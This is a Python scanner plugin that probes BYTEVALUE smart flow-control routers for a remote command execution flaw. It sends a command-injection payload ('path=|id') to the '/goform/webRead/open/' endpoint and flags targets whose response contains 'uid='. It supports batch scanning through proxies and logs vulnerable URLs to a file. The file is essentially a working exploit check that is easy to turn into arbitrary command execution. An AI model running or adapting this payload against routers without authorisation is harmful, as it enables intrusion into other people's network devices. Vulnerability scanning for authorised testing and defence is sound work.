#! /usr/bin/python3
# -*- encoding: utf-8 -*-
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
import requests,urllib3
urllib3.disable_warnings()

class BYTEVALUE_Rce_Scan:
    def __init__(self):
        self.header = None
        self.proxy = None

    def send_payload(self,url):
        url2 = url + '/goform/webRead/open/?path=|id'
        try:
            req = requests.get(url2, timeout=3,verify=self.verify,proxies=self.proxy,headers=self.header)
            if "uid=" in req.text:
                OutPrintInfoSuc("BYTEVALUE", f"存在BYTEVALUE智能流控路由器远程命令漏洞 {url2}")
                if self.batch:
                    with open("./result/bytevalue_rce.txt","a") as w:
                        w.write(f"{url2}\n")
                return True
            else:
                if not self.batch:
                    OutPrintInfo("BYTEVALUE", f"不存在BYTEVALUE智能流控路由器远程命令漏洞")
                return False
        except Exception:
            if not self.batch:
                OutPrintInfo("BYTEVALUE", "不存在BYTEVALUE智能流控路由器远程命令漏洞")
            return False
    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.verify = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("BYTEVALUE", "开始检测BYTEVALUE智能流控路由器远程命令漏洞...")
        self.send_payload(url)
        if not self.batch:
            OutPrintInfo("BYTEVALUE", "BYTEVALUE智能流控路由器远程命令漏洞检测结束")
